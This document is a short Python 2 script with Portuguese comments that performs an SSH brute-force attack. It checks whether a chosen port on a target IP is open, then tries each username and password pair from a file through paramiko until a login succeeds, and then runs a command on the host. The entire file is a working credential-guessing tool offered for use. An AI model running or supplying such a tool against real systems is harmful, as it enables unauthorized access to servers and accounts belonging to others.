# Importacao das bibliotecas necessarias
import paramiko, sys, os, socket

# Leitura e setando dados - Inicio
arquivo = "userpasswd.txt"
mensagem = " echo '--- Conexao SSH realizada com sucesso!'"
i =1
portaAberta = 0

endereco = raw_input(">>> IP: ")
porta = 22
print "\nPorta padrao: 22"
print "S | N"
resposta = raw_input(">>> Deseja informar a porta: ")
resposta = resposta.strip().lower()
if resposta == "s":
    porta = input(">>> Porta: ")
# Leitura e setando variaveis - Fim

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
resultado = sock.connect_ex((endereco, porta))

# Verificando se a porta esta aberta - Inicio
if resultado == 0:

    print "\nA porta",porta,"esta aberta\n"
    print "S | N"
    resposta = raw_input(">>> Deseja realizar o ataque de forca bruta? ")
    resposta = resposta.strip().lower()
    #Usuario escolhe se que fazer o ataque - Inicio
    if resposta == "s":

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_stdin = ssh_stdout = ssh_stderr = None
        #Laco de repeticao para pegar o usuario e senha separado por virgulas - Inicio
        file = open(arquivo, "r")
        for line in file:
            try:
                usuario = line.split(",")[0].strip()
                senha = line.split(",")[1].strip()

                print "\n---",i,"Tentativa - Usuario:",usuario,"e Senha:",senha
                # Testando a combinacao de login
                ssh.connect(endereco, username=usuario, password=senha)
                # Se acessar e mostrado uma mensagem de conexao realizada com sucesso
                if ssh:
                    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(mensagem)
                    break
            except Exception as e:
                # Se nao acessar e mostrado uma mensagem de erro na conexao
                print "--- Erro na conexao SSH!\n"
            i+=1
        #Laco de repeticao - Fim

        if ssh_stdout:
            sys.stdout.write(ssh_stdout.read())
        if ssh_stderr:
            sys.stderr.write(ssh_stderr.read())
    else:
        print "Saindo...\n"
        sys.exit(4)
    #Usuario prefere nao fazer o ataque -Fim
else:
    print "--- A porta",porta,"nao esta aberta"
# Verificando se a porta esta aberta - Fim
